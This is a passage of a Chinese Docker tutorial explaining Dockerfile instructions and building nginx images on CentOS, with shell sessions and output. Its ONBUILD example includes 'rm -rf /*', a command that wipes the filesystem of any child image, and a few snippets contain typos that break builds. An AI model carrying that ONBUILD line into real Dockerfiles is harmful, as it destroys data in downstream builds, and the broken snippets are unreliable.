2）如果docker run 后面没有额外参数，但是dockerfile中的CMD里有（即上面CMD的第三种用法），即Dockerfile中即有CMD也有ENTRYPOINT,那么CMD的全部内容会作为ENTRYPOINT的参数。
3）如果docker run 后面有额外参数，同时Dockerfile中即有CMD也有ENTRYPOINT,那么docker run后面的参数覆盖掉CMD参数内容,最终作为ENTRYPOINT的参数。
4）可以通过docker run --entrypoint string 参数在运行时替换,注意string不要加空格使用CMD要在运行时重新写命令本身,然后在后面才能追加运行参数，ENTRYPOINT则可以运行时无需重写命令就可以直接接受新参数。
5）每个 Dockerfile 中只能有一个 ENTRYPOINT，当指定多个时，只有最后一个生效。




#案例1
#编写Dockerfile文件2
[root@centos7 centos7]# vim Dockerfile
FROM centos:7.9.2009
LABEL author="liusenbiao <root@liusenbiao.com>" \
      version="0.1"  \
      description="test baseimage"
RUN rm -rf /etc/yum.repos.d/*
COPY base.repo /etc/yum.repos.d/
RUN yum -y install wget vim gcc bzip2 tree nginx
ADD a.tgz /data/testdir/
RUN mkdir /app
ENV VERSION="1.0" USER=mysql
RUN touch /app/${VERSION}.log
ENTRYPOINT ["nginx", "-g", "daemon off;"]   #修改此处！



[root@centos7 centos7]# ./build.sh centos7.9:v5.0
[root@centos7 centos7]# docker run -d -p 80:80 centos7.9:v5.0
#强行替换ENTRYPOINT
[root@centos7 centos7]# docker run -d --entrypoint tail centos7.9:v5.0 -f /etc/hosts




#案例2
[root@ubuntu1804 dockerfile]#cat Dockerfile
FROM ubuntu:18.04
RUN apt update \
&& apt -y install  curl \
&& rm -rf /var/lib/apt/lists/*
ENTRYPOINT [ "curl", "-s","http://cip.cc"]



[root@centos7 centos7]# curl -s http://cip.cc
IP	: 223.87.230.143
地址	: 中国  四川  成都
运营商	: 移动

数据二	: 四川省成都市 | 移动

数据三	: 

URL	: http://www.cip.cc/223.87.230.143



[root@centos8 dockerfile]#podman run -it --rm f68e006 
{"ip": "111.199.187.36", "country": "北京市", "city": "联通"}



#追加-i参数
[root@centos8 dockerfile]#podman run -it --rm f68e006 -i
HTTP/2 200
date: Sun, 23 Feb 2020 08:05:19 GMT
content-type: application/json; charset=UTF-8
set-cookie: __cfduid=d4a22496ea6f3b2861763354f8ca600711582445119; expires=Tue, 
24-Mar-20 08:05:19 GMT; path=/; domain=.ip.cn; HttpOnly; SameSite=Lax
cf-cache-status: DYNAMIC
expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdncgi/beacon/expect-ct"
alt-svc: h3-25=":443"; ma=86400, h3-24=":443"; ma=86400, h3-23=":443"; ma=86400
server: cloudflare
cf-ray: 5697b1ac1862eb41-LAX

{"ip": "111.199.187.36", "country": "北京市", "city": "联通"}
```

**范例: 利用脚本实现指定环境变量动态生成配置文件内容**

```
[root@ubuntu1804 ~]#echo 'Nginx Website in Dockerfile' > index.html
[root@ubuntu1804 ~]#cat Dockerfile
FROM nginx:1.16-alpine
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
ENV DOC_ROOT='/data/website/'
ADD index.html ${DOC_ROOT}
ADD entrypoint.sh /bin/
EXPOSE 80/tcp 8080

#HEALTHCHECK --start-period=3s CMD wget -0 - -q http://${IP:-0.0.0.0}:
{PORT:-80}/

CMD ["/usr/sbin/nginx","-g", "daemon off;"]  #CMD指令的内容都成为了ENTRYPOINT的参数
ENTRYPOINT [ "/bin/entrypoint.sh"]   #调用脚本！！！


[root@ubuntu1804 ~]#cat entrypoint.sh
#!/bin/sh 
cat > /etc/nginx/conf.d/www.conf <<EOF
server {
   server_name ${HOSTNAME};
   listen ${IP:-0.0.0.0}:${PORT:-80};
   root   ${DOC_ROOT:-/usr/share/nginx/html}; }
EOF
exec "$@"
[root@ubuntu1804 ~]#chmod +x entrypoint.sh
[root@ubuntu1804 ~]#docker build -t nginx:v1.0 . 
[root@ubuntu1804 ~]#docker run --name n1 --rm -d -e "PORT=8080" -e 
"HOSTNAME=www.liusenbiao.org" nginx:v1.0
```

###### 48.6.3.3.9  ARG: 构建参数(了解)

```
#概述
ARG指令在build阶段指定变量,和ENV不同的是，容器运行时不会存在这些环境变量
ARG <name>[=<default value>]
如果和ENV同名，ENV覆盖ARG变量
可以用 docker build --build-arg <参数名>=<值> 来覆盖


#范例:
[root@ubuntu1804 ~]#cat Dockerfile
FROM busybox
ARG author="liu <root@liusenbiao.com>"
LABEL maintainer="${author}"


#用build覆盖--build-arg变量内容
[root@ubuntu1804 ~]#docker build --build-arg author="29308620@qq.com" -t 
busybox:v1.0 .
```

**说明: ARG和FROM**

```
#FROM指令支持由第一个FROM之前的任何ARG指令声明的变量

#示例:
ARG CODE_VERSION=latest
FROM base:${CODE_VERSION}
CMD /code/run-app
FROM extras:${CODE_VERSION}
CMD /code/run-extras


#在FROM之前声明的ARG在构建阶段之外，所以它不能在FROM之后的任何指令中使用。 要使用在第一个FROM
之前声明的ARG的默认值，请在构建阶段内使用没有值的ARG指令

#示例:
ARG VERSION=latest
FROM busybox:$VERSION
ARG VERSION
RUN echo $VERSION > image_version	
```

###### 48.6.3.3.10  VOLUME:挂载点

```
#概述
在容器中创建一个可以从本地主机或其他容器挂载的挂载点，一般用来存放数据库和需要保持的数据等，一般会将宿主机上的目录挂载至VOLUME指令指定的容器目录。即使容器后期被删除，此宿主机的目录仍会保留，从而实现容器数据的持久保存。

宿主机目录为：
/var/lib/docker/volumes/<volume_id>/_data

语法:
VOLUME <容器内路径>
VOLUME ["<容器内路径1>", "<容器内路径2>"...]

注意:
1）Dockerfile中的VOLUME实现的是匿名数据卷,无法指定宿主机路径和容器目录的挂载关系。
2）通过docker rm -fv <容器ID> 可以删除容器的同时删除VOLUME指定的卷。




#范例:
[root@centos8 ~]#cat /data/dockerfile/system/alpine/Dockerfile 
FROM alpine:3.11 
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
COPY repositories /etc/apk/repositories 
VOLUME [ "/testdata","/testdata2" ]


[root@centos8 alpine]#docker run -it --rm 8ef61dd3959da3f sh
/ # df 
Filesystem           1K-blocks     Used Available Use% Mounted on
overlay              104806400   3656380 101150020   3% /
tmpfs                    65536         0     65536   0% /dev
/dev/sda2            104806400   3656380 101150020   3% /testdata2
/dev/sda2            104806400   3656380 101150020   3% /testdata
/ # cp /etc/issue /testdata/f1.txt
/ # cp /etc/issue /testdata2/f2.txt




#容器挂载到宿主机的目录
[root@centos8 ~]#tree /var/lib/docker/volumes/725f0f67921bdbffbe0aaf9b015d663a/_data
├── 725f0f67921bdbffbe0aaf9b015d663a6e3ddd24674990d492025dfcf878529b
│   └── _data
│       └── f1.txt
└── fbd13e5253deb375e0dea917df832d2322e96b04ab43bae061584dcdbe7e89f2
   └── _data
       └── f2.txt
4 directories, 2 files




#删除volumes在宿主机上的目录
[root@centos7 centos7]# docker rm --help

Usage:	docker rm [OPTIONS] CONTAINER [CONTAINER...]

Remove one or more containers

Options:
  -f, --force     Force the removal of a running container (uses SIGKILL)
  -l, --link      Remove the specified link
  -v, --volumes   Remove anonymous volumes associated with the containe
  
[root@centos8 ~]# docker rm -fv 8ef61dd3959da3f
```

###### 48.6.3.3.11 EXPOSE: 暴露端口

```
指定服务端的容器需要对外暴露(监听)的端口号，以实现容器与外部通信。
EXPOSE 仅仅是声明容器打算使用什么端口而已,并不会真正暴露端口,即不会自动在宿主进行端口映射因此，在启动容器时需要通过 -P 或-p ，Docker 主机才会真正分配一个端口转发到指定暴露的端口才可使用。

注意: 即使 Dockerfile没有EXPOSE 端口指令,也可以通过docker run -p临时暴露容器内程序真正监听的端口,所以EXPOSE 相当于指定默认的暴露端口,可以通过docker run -P进行真正暴露。

EXPOSE <port>[/ <protocol>] [<port>[/ <protocol>] ..]
    
#说明
<protocol>用于指定传输层协议，可为tcp或udp二者之一，默认为TCP协议
```

**范例:**

```
EXPOSE 80 443
EXPOSE 11211/udp 11211/tcp
```

**范例:**

```
[root@ubuntu1804 dockerfile]#pwd
/data/dockerfile
[root@ubuntu1804 dockerfile]#echo Website in Dockerfile > index.html
[root@ubuntu1804 dockerfile]#vim Dockerfile
FROM busybox
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
COPY index.html /data/website/
EXPOSE 80    #修改此处！！



#创建构建镜像脚本
[root@centos7 centos7]# cat build.sh 
#!/bin/bash
docker build -t $1 .
[root@centos7 centos7]# chmod +x build.sh



[root@ubuntu1804 dockerfile]#./build.sh v1.0
[root@ubuntu1804 dockerfile]#ls
build.sh Dockerfile index.html
[root@ubuntu1804 dockerfile]#docker run --rm -P --name c1 test:v1.0 /bin/httpd -f -h /data/website
[root@ubuntu1804 ~]#docker port c1
80/tcp -> 0.0.0.0:32773
[root@ubuntu1804 ~]#curl 127.0.0.1:32773
Website in Dockerfile
[root@ubuntu1804 ~]#docker kill c1
c1
```

###### 48.6.3.3.12  WORKDIR: 指定工作目录

```
#概述
为后续的 RUN、CMD、ENTRYPOINT 指令配置工作目录，当容器运行后，进入容器内WORKDIR指定的默认目录。
WORKDIR 指定工作目录（或称当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，WORKDIR 会自行创建。

WORKDIR /path/to/workdir



#范例:
#两次RUN独立运行,不在同一个目录，
RUN cd /app
RUN echo "hello" > world.txt


#如果想实现相同目录可以使用WORKDIR
WORKDIR /app
RUN echo "hello" > world.txt


#可以使用多个WORKDIR指令，后续命令如果参数是相对路径，则会基于之前命令指定的路径。例如
WORKDIR /a
WORKDIR b
WORKDIR c
RUN pwd
则最终路径为 /a/b/c
```

###### 48.6.3.3.13 ONBUILD: 子镜像引用父镜像的指令

```
#概述
可以用来配置当构建当前镜像的子镜像时，会自动触发执行的指令,但在当前镜像构建时,并不会执行,即延迟到子镜像构建时才执行。
ONBUILD [INSTRUCTION]



#范例：
例如，Dockerfile 使用如下的内容创建了镜像 image-A。
ONBUILD ADD http://liusenbiao.cn/download/heman/photos/f152bbb7af5ec6355ee7f1f808e1ef6.jpg  /data/
ONBUILD RUN rm -rf /*
ONBUILD RUN /usr/local/bin/python-build --dir /app/src...


#如果基于 image-A 创建新的镜像image-B时，新的Dockerfile中使用 FROM image-A指定基础镜像时，会自动执行ONBUILD 指令内容，等价于在后面添加了两条指令。
FROM image-A


#Automatically run the following
ONBUILD ADD http://liusenbiao.cn/download/heman/photos/f152bbb7af5ec6355ee7f1f808e1ef6.jpg  /data/
ONBUILD RUN rm -rf /*
ONBUILD RUN /usr/local/bin/python-build --dir /app/src...



#说明:
1）尽管任何指令都可注册成为触发器指令，但ONBUILD不能自我能套，且不会触发FROM和MAINTAINER指令。
2）使用ONBUILD指令的镜像，推荐在标签中注明，例如 ruby:1.9-onbuild。
```

###### 48.6.3.3.14 USER: 指定当前用户

```
#概述
指定运行容器时的用户名或 UID，后续的 RUN 也会使用指定用户
当服务不需要管理员权限时，可以通过该命令指定运行用户
这个用户必须是事先建立好的，否则无法切换
如果没有指定 USER,默认是 root 身份执行

USER <user>[:<group>] 
USER <UID>[:<GID>]



#范例：
RUN groupadd -r mysql && useradd -r -g mysql mysql
USER mysql
```

###### 48.6.3.3.15 HEALTHCHECK: 健康检查(了解)

```
#概述
检查容器的健康性
HEALTHCHECK [选项] CMD <命令> #设置检查容器健康状况的命令
HEALTHCHECK NONE #如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令

HEALTHCHECK 支持下列选项:  
--interval=<间隔>  #两次健康检查的间隔，默认为 30 秒
--timeout=<时长>    #健康检查命令运行超时时间，如果超过这个时间，本次健康检查就被视为失败，默认30秒
--retries=<次数>    #当连续失败指定次数后，则将容器状态视为 unhealthy，默认3次
--start-period=<FDURATION> #default: 0s


#检查结果返回值: 0  #success   the container is healthy and ready for use
1  #unhealth   the container is not working correctly
2  #reserved   do not use this exit code
```

**范例：**

```
FROM nginx
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
HEALTHCHECK --interval=5s --timeout=3s \
CMD curl -fs http://localhost/ || exit 1
```

###### 48.6.3.3.16 STOPSIGNAL: 退出容器的信号(了解)

```
#概述
该STOPSIGNAL指令设置将被发送到容器退出的系统调用信号。该信号可以是与内核syscall表中的位置匹配的有效无符号数字（例如9），也可以是SIGNAME格式的信号名称（例如SIGKILL)。

STOPSIGNAL signal
```

###### 48.6.3.3.17 SHELL : 指定shell(了解)

```
#概述
SHELL指令允许覆盖用于命令的shell形式的默认SHELL, 必须在Dockerfile中以JSON形式编写SHELL指令。
SHELL ["executable", "parameters"]



在Linux上默认SHELL程序为[“/bin/sh”，“-c”]，在Windows上，默认SHELL程序为[“cmd”，“/S”，“/C”]。
SHELL指令在Windows上特别有用，在Windows上有两个常用且完全不同的本机SHELL:cmd和powershell，以及包括sh在内的备用shell。
SHELL指令可以出现多次。 每个SHELL指令将覆盖所有先前的SHELL指令，并影响所有后续的指令
FROM microsoft/windowsservercore
# Executed as cmd /S /C echo default
RUN echo default

# Executed as cmd /S /C powershell -command Write-Host default
RUN powershell -command Write-Host default

# Executed as powershell -command Write-Host hello
SHELL ["powershell", "-command"]
RUN Write-Host hello

# Executed as cmd /S /C echo hello
SHELL ["cmd", "/S", "/C"]
RUN echo hello
```

###### 48.6.3.3.18 .dockerignore文件

```
官方文档: https://docs.docker.com/engine/reference/builder/#dockerignore-file.
与.gitignore文件类似，生成构建上下文时Docker客户端应忽略的文件和文件夹指定模式.
.dockerignore 使用 Go 的文件路径规则 filepath.Match.
参考链接: https://golang.org/pkg/path/filepath/#Match.
```

**完整的语法**

```
#     #以#开头的行为注释
*     #匹配任何非分隔符字符序列
?     #匹配任何单个非分隔符
\\    #表示 \
**    #匹配任意数量的目录（包括零）例如，**/*.go将排除在所有目录中以.go结尾的所有文件，包括构建上下文的根。
!     #表示取反，可用于排除例外情况
```

![1659799153828](linux体系.assets/1659799153828.png)

**范例:** 

```
#排除 test 目录下的所有文件
test/*

#排除 md 目录下的 xttblog.md 文件
md/xttblog.md

#排除 xttblog 目录下的所有 .md 的文件
xttblog/*.md

#排除以 xttblog 为前缀的文件和文件夹
xttblog?

#排除所有目录下的 .sql 文件夹
**/*.sql

#除了README的md不排外，排除所有md文件，但不排除README-secret.md
*.md
!README*.md
README-secret.md

#除了所有README的md文件以外的md都排除
*.md
README-secret.md
!README*.md
```

###### 48.6.3.3.19 Dockerfile构建过程和指令总结

**Dockerfile 构建过程**

```
1）从基础镜像运行一个容器
2）执行一条指令，对容器做出修改
3）执行类似docker commit的操作，提交一个新的中间镜像层(可以利用中间层镜像创建容器进行调试和排错)
4）再基于刚提交的镜像运行一个新容器
5）执行Dockerfile中的下一条指令，直至所有指令执行完毕
```

**Dockerfile 指令总结**

![1659799397690](linux体系.assets/1659799397690.png)

**Dockerfile到容器阶段图**

![1659799460945](linux体系.assets/1659799460945.png)

###### 48.6.3.3.20 构建镜像docker build命令

```
#docker build命令使用Dockerfile文件创建镜像

docker build [OPTIONS] PATH | URL | -
说明: 

PATH | URL | -     #可以使是本地路径，也可以是URL路径。若设置为 - ，则从标准输入获取Dockerfile的内容
-f, --file string  #Dockerfile文件名,默认为 PATH/Dockerfile
--force-rm         #总是删除中间层容器,创建镜像失败时，删除临时容器
--no-cache         #不使用之前构建中创建的缓存
-q  --quiet=false  #不显示Dockerfile的RUN运行的输出结果
--rm=true          #创建镜像成功时，删除临时容器
-t --tag list      #设置注册名称、镜像名称、标签。格式为 <注册名称>/<镜像名称>:<标签>（标签默认为latest）
```

**范例:**

```
docker build .
docker build /usr/local/src/nginx
docker build -f /path/to/a/Dockerfile .
docker build -t shykes/myapp .
docker build -t shykes/myapp:1.0.2 -t shykes/myapp:latest .
docker build -t test/myapp .
docker build -t nginx:v1 /usr/local/src/nginx
```

**查看镜像的构建历史: docker history 镜像ID**

```
[root@centos8 ~]#docker history 90201858b1fc
ID             CREATED         CREATED BY                                     
SIZE     COMMENT
90201858b1fc   17 minutes ago   /bin/sh -c #(nop) CMD ["tail" ,"-f","/etc/...   
0B        
<missing>      2 hours ago     /bin/sh -c apt-get update && apt-get insta...   
14.83MB   
<missing>      35 hours ago     /bin/sh -c #(nop) CMD ["/bin/bash"]             
14.83MB   
<missing>      35 hours ago     /bin/sh -c mkdir -p /run/systemd && echo '...   
3.072kB   
<missing>      35 hours ago     /bin/sh -c set -xe && echo '#!/bin/sh' > /...   
15.87kB   
<missing>      35 hours ago     /bin/sh -c [ -z "$(apt-get indextargets)" ]     
991.2kB   
<missing>      35 hours ago     /bin/sh -c #(nop) ADD file:91a750fb184711f...   
65.58MB  
```

**范例: 利用Dockerfile构建基于CentOS的nginx镜像**

```
[root@ubuntu1804 ~]#cat /data/Dockerfile 
FROM centos 
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
RUN yum install -y nginx && echo Nginx Website in Docker > 
/usr/share/nginx/html/index.html
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
#ENTRYPOINT ["nginx", "-g", "daemon off;"]



[root@ubuntu1804 ~]#docker build -t nginx_centos8.2:v1.14.1 /data/
Sending build context to Docker daemon  209.2MB
Step 1/6 : FROM centos
---> 831691599b88
Step 2/6 : LABEL maintainer="liusenbiao <root@liusenbiao.com>"
---> Running in 3fc4487e80f9
Removing intermediate container 3fc4487e80f9
---> 598318841b8a
Step 3/6 : RUN yum install -y nginx
---> Running in 8a6d9866e4ae
CentOS-8 - AppStream                            2.1 MB/s | 5.8 MB     00:02    
CentOS-8 - Base                                 1.8 MB/s | 2.2 MB     00:01    
CentOS-8 - Extras                               8.6 kB/s | 7.0 kB     00:00   
.......
Complete!
Removing intermediate container 8a6d9866e4ae
---> 8963fb608c33
Step 4/6 : RUN echo Nginx Website in Docker > /usr/share/nginx/html/index.html
---> Running in 04d4287aac49
Removing intermediate container 04d4287aac49
---> 9a95e56b9bc0
Step 5/6 : EXPOSE 80
---> Running in 8534523d8aa6
Removing intermediate container 8534523d8aa6
---> 23cca5737903
Step 6/6 : CMD ["nginx", "-g", "daemon off;"]
---> Running in d52fcc21444f
Removing intermediate container d52fcc21444f
---> afdaec99eb35
Successfully built afdaec99eb35
Successfully tagged nginx_centos8.2:v1.14.1




[root@ubuntu1804 ~]#docker run -d -P --name nginx-web nginx_centos8.2:v1.14.1 
3faba5a49f63ab3a1b031da5e4940303b10ddf349069184597e703c572d257d8
[root@ubuntu1804 ~]#docker ps
CONTAINER ID       IMAGE                     COMMAND                 CREATED   
          STATUS             PORTS                   NAMES
3faba5a49f63       nginx_centos8.2:v1.14.1   "nginx -g 'daemon of…"   4 seconds 
ago       Up 3 seconds        0.0.0.0:32775->80/tcp   nginx-web
[root@ubuntu1804 ~]#curl http://127.0.0.1/32775
curl: (7) Failed to connect to 127.0.0.1 port 80: Connection refused
[root@ubuntu1804 ~]#curl http://127.0.0.1:32775
Nginx Website in Docker
[root@ubuntu1804 ~]#curl -I http://127.0.0.1:32775
HTTP/1.1 200 OK
Server: nginx/1.14.1
Date: Wed, 22 Jul 2020 17:09:15 GMT
Content-Type: text/html
Content-Length: 24
Last-Modified: Wed, 22 Jul 2020 17:04:40 GMT
Connection: keep-alive
ETag: "5f1871a8-18"
Accept-Ranges: bytes
```

**范例: 刷新镜像缓存重新构建新镜像**

```
[root@ubuntu1804 ~]#cat /data/Dockerfile
FROM centos 
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
RUN yum install -y nginx
RUN echo Nginx Website in Docker > /usr/share/nginx/html/index.html
#修改下面行,从下面行开始不再使用缓存
ENV REFRESH_DATA 2020-01-01
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]

[root@ubuntu1804 ~]#docker build   -t nginx_centos8.2:v1.14.1 /data/
Sending build context to Docker daemon  209.2MB
Step 1/7 : FROM centos
---> 831691599b88
Step 2/7 : LABEL maintainer="liusenbiao <root@liusenbiao.com>"
---> Using cache
---> 598318841b8a
Step 3/7 : RUN yum install -y nginx
---> Using cache
---> 8963fb608c33
Step 4/7 : RUN echo Nginx Website in Docker > /usr/share/nginx/html/index.html
---> Using cache
---> 9a95e56b9bc0
Step 5/7 : ENV REFRESH_DATA 2020-01-01  #从此行开始不再利用缓存
---> Running in 4607ee0d0e77
Removing intermediate container 4607ee0d0e77
---> d6235889f336
Step 6/7 : EXPOSE 80
---> Running in 6924aab5c5c8
Removing intermediate container 6924aab5c5c8
---> 545393760683
Step 7/7 : CMD ["nginx", "-g", "daemon off;"]
---> Running in 345bbc6179d8
Removing intermediate container 345bbc6179d8
---> 4bafc2d0c7e0
Successfully built 4bafc2d0c7e0
Successfully tagged nginx_centos8.2:v1.14.1




#全部不利用缓存重新构建镜像
[root@ubuntu1804 ~]#docker build --no-cache -t nginx_centos8.2:v1.14.1 /data/
Sending build context to Docker daemon  209.2MB
Step 1/7 : FROM centos
---> 831691599b88
Step 2/7 : LABEL maintainer="liusenbiao <root@liusenbiao.com>"
---> Running in 41f2aab6657f
Removing intermediate container 41f2aab6657f
---> 091969d0ed9e
Step 3/7 : RUN yum install -y nginx
---> Running in 6e174d492348
CentOS-8 - AppStream                            4.2 MB/s | 5.8 MB     00:01    
CentOS-8 - Base                                 1.7 MB/s | 2.2 MB     00:01    
CentOS-8 - Extras                               1.2 kB/s | 7.0 kB     00:05    
Dependencies resolved.
......  

Complete!
Removing intermediate container 6e174d492348
---> ba62ac34b951
Step 4/7 : RUN echo Nginx Website in Docker > /usr/share/nginx/html/index.html
---> Running in d6f785b28ef6
Removing intermediate container d6f785b28ef6
---> 6e15fdc84e21
Step 5/7 : ENV REFRESH_DATA 2020-06-06
---> Running in c6fd87ed95f6
Removing intermediate container c6fd87ed95f6
---> 328b8621ec36
Step 6/7 : EXPOSE 80
---> Running in 1af3d6964d81
Removing intermediate container 1af3d6964d81
---> 7c513643b182
Step 7/7 : CMD ["nginx", "-g", "daemon off;"]
---> Running in fd9216490941
Removing intermediate container fd9216490941
---> 0b2b61dd0445
Successfully built 0b2b61dd0445
Successfully tagged nginx_centos8.2:v1.14.1
```

##### 48.6.3.4 实战Dockerfile案例

###### 48.6.3.4.1 制作基于基础镜像的Base镜像

**准备目录结构，下载镜像并初始化系统**

```
#按照业务类型或系统类型等方式划分创建目录环境，方便后期镜像比较多的时候进行分类
[root@ubuntu1804 ~]#mkdir 
/data/dockerfile/{web/{nginx,apache,tomcat,jdk},system/{centos,ubuntu,alpine,deb
ian}} -p
[root@ubuntu1804 ~]#tree /data/dockerfile/
/data/dockerfile/
├── system
│   ├── alpine
│   ├── centos
│   ├── debian
│   └── ubuntu
└── web
   ├── apache
   ├── jdk
   ├── nginx
   └── tomcat
   
10 directories, 0 files


#下载基础镜像
[root@ubuntu1804 ~]#docker pull centos:centos7.7.1908
[root@ubuntu1804 ~]#docker images
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
centos             centos7.7.1908     08d05d1d5859        2 months ago       
204MB
```

**先制作基于基础镜像的系统Base镜像**

```
#先制作基于基础镜像的系统base镜像
[root@ubuntu1804 ~]#cd /data/dockerfile/system/centos/
#创建Dockerfile，注意可以是dockerfile，但无语法着色功能


[root@ubuntu1804 centos]#cat Dockerfile
FROM centos:centos7.7.1908
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
RUN yum -y install wget && rm -f /etc/yum.repos.d/* && wget -P /etc/yum.repos.d/ 
http://mirrors.aliyun.com/repo/Centos-7.repo \
   && wget -P /etc/yum.repos.d/ http://mirrors.aliyun.com/repo/epel-7.repo \
   && yum -y install vim-enhanced tcpdump lrzsz tree telnet bash-completion net-tools wget curl bzip2 lsof zip unzip nfs-utils gcc make gcc-c++ glibc glibc-devel pcre pcre-devel openssl openssl-devel systemd-devel zlib-devel \
   && yum clean all \
   && rm -f /etc/localtime \
   && ln -s ../usr/share/zoneinfo/Asia/Shanghai /etc/localtime
   
   
[root@ubuntu1804 centos]#vim build.sh
[root@ubuntu1804 centos]#cat build.sh
#!/bin/bash
#
docker build -t centos7-base:v1 .
[root@ubuntu1804 centos]#chmod +x build.sh
[root@ubuntu1804 centos]#./build.sh 
[root@ubuntu1804 centos]#docker images 
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
centos7-base       v1                 1ba1317e06dc        23 seconds ago     
402MB
centos             centos7.7.1908     08d05d1d5859        2 months ago       
204MB
[root@ubuntu1804 centos]#docker image history centos7-base:v1  
IMAGE               CREATED             CREATED BY                               
      SIZE               COMMENT
1ba1317e06dc        43 seconds ago     /bin/sh -c yum -y install wget && rm -f
/etc…   198MB               
6b87f2843eb9       About an hour ago   /bin/sh -c #(nop) LABEL 
maintainer=wangxiao…   0B                  
08d05d1d5859        2 months ago       /bin/sh -c #(nop) CMD ["/bin/bash"]     
      0B                  
<missing>           2 months ago       /bin/sh -c #(nop) LABEL org.labelschema.sc…   0B                  
<missing>           2 months ago       /bin/sh -c #(nop) ADD 
file:3e2a127b44ed01afc…   204MB
```

###### 48.6.3.4.2 制作基于Base镜像的nginx镜像

**在Dockerfile目录下准备编译安装的相关文件**

```
[root@ubuntu1804 ~]#mkdir /data/dockerfile/web/nginx/1.16
[root@ubuntu1804 ~]#cd /data/dockerfile/web/nginx/1.16
[root@ubuntu1804 1.16]#wget http://nginx.org/download/nginx-1.16.1.tar.gz
[root@ubuntu1804 1.16]#mkdir app/
[root@ubuntu1804 1.16]#echo "Test Page in app" > app/index.html
[root@ubuntu1804 1.16]#tar zcf app.tar.gz app
[root@ubuntu1804 1.16]#ls
app app.tar.gz nginx-1.16.1.tar.gz
```

**在一台测试机进行编译安装同一版本的nginx生成模版配置文件**

```
[root@centos7 ~]#yum -y install vim-enhanced tcpdump lrzsz tree telnet bash-completion net-tools wget bzip2 lsof tmux man-pages zip unzip nfs-utils gcc make gcc-c++ glibc glibc-devel pcre pcre-devel openssl openssl-devel systemd-devel zlib-devel
[root@centos7 ~]#wget -P /usr/local/src http://nginx.org/download/nginx-1.16.1.tar.gz
[root@centos7 ~]#cd /usr/local/src/
[root@centos7 src]#tar xvf nginx-1.16.1.tar.gz 
[root@centos7 src]#cd nginx-1.16.1/
[root@centos7 nginx-1.16.1]#./configure --prefix=/apps/nginx && make && make 
install 


#将配置文件复制到nginx镜像的服务器相应目录下
[root@centos7 ~]#scp /apps/nginx/conf/nginx.conf 10.0.0.100:/data/dockerfile/web/nginx/1.16 


#准备配置文件
[root@ubuntu1804 1.16]#vim /data/dockerfile/web/nginx/1.16/nginx.conf
worker_processes  1;
user nginx;
daemon off;   #增加此行,前台运行nginx
```

**编写Dockerfile文件**

```
[root@ubuntu1804 ~]#cd /data/dockerfile/web/nginx
[root@ubuntu1804 nginx]#vim Dockerfile 
[root@ubuntu1804 nginx]#cat Dockerfile 
FROM centos7-base:v1
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
ADD nginx-1.16.1.tar.gz /usr/local/src
RUN cd /usr/local/src/nginx-1.16.1 && \
   && ./configure --prefix=/apps/nginx \
   && make && make install \
   && rm -f /usr/local/src/nginx* \
   && useradd -r nginx
COPY nginx.conf /apps/nginx/conf/
ADD app.tar.gz /apps/nginx/html/
EXPOSE 80 443
CMD ["/apps/nginx/sbin/nginx"]
```

**生成nginx镜像**

```
[root@ubuntu1804 ~]#cd /data/dockerfile/web/nginx/1.16
[root@ubuntu1804 1.16]#ls
app app.tar.gz build.sh Dockerfile nginx-1.16.1.tar.gz nginx.conf
[root@ubuntu1804 1.16]#vim build.sh
[root@ubuntu1804 1.16]#cat build.sh
#!/bin/bash
#
docker build -t nginx-centos7:1.6.1 . 
[root@ubuntu1804 1.16]#chmod +x build.sh
[root@ubuntu1804 1.16]#./build.sh 
[root@ubuntu1804 1.16]# docker images 
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
nginx-centos7       1.6.1               73e4b4b95bca        10 minutes ago     
412MB
centos7-base       v1                 1ba1317e06dc       About an hour ago   
402MB
centos             centos7.7.1908     08d05d1d5859        2 months ago       
204MB
```

**生成的容器测试镜像**

```
[root@ubuntu1804 ~]#docker run -d -p 80:80 nginx-centos7:1.6.1
e8e733c6dc96bfb212a15dec04cfcfcac72daf400f5d2423c707aeb778a1859d

[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE                 COMMAND                 CREATED       
      STATUS             PORTS                         NAMES
e8e733c6dc96       centos7-nginx:1.6.1   "/apps/nginx/sbin/ng…"   4 seconds ago 
      Up 2 seconds        0.0.0.0:80->80/tcp, 443/tcp   cool_germain
[root@ubuntu1804 ~]#docker exec -it e8e733c6dc96 bash
[root@e8e733c6dc96 /]# ps aux
USER       PID %CPU %MEM   VSZ   RSS TTY     STAT START   TIME COMMAND
root          1  0.2  0.2  20572  2468 ?       Ss   03:36   0:00 nginx: master 
process /apps/nginx/sbin/nginx
nginx        12  0.0  0.2  21024  2344 ?       S    03:36   0:00 nginx: worker 
process
root         13  4.0  0.3  12364  3536 pts/0   Ss   03:37   0:00 bash
root         32  0.0  0.3  51764  3460 pts/0   R+   03:37   0:00 ps aux
[root@e8e733c6dc96 /]# exit
exit
[root@ubuntu1804 ~]#curl 127.0.0.1/app/
Test Page in app
```

###### 48.6.3.4.3 Dockerfile直接制作nginx镜像

**在Dockerfile目录下准备编译安装的相关文件**

```
[root@ubuntu1804 ~]#mkdir /data/dockerfile/web/nginx/1.16.1
[root@ubuntu1804 ~]#cd /data/dockerfile/web/nginx/1.16.1
[root@ubuntu1804 1.16.1]#vim nginx.conf
user nginx;
worker_processes  1;
#daemon off;
[root@ubuntu1804 1.16.1]#wget http://nginx.org/download/nginx-1.16.1.tar.gz
```

**编写Dockerfile文件**

```
[root@ubuntu1804 1.16.1]#pwd
/data/dockerfile/web/nginx/1.16.1
[root@ubuntu1804 1.16.1]#cat Dockerfile
#Nginx Dockerfile
FROM centos:centos7.7.1908 
MAINTAINER liusenbiao <root@liusenbiao.com>
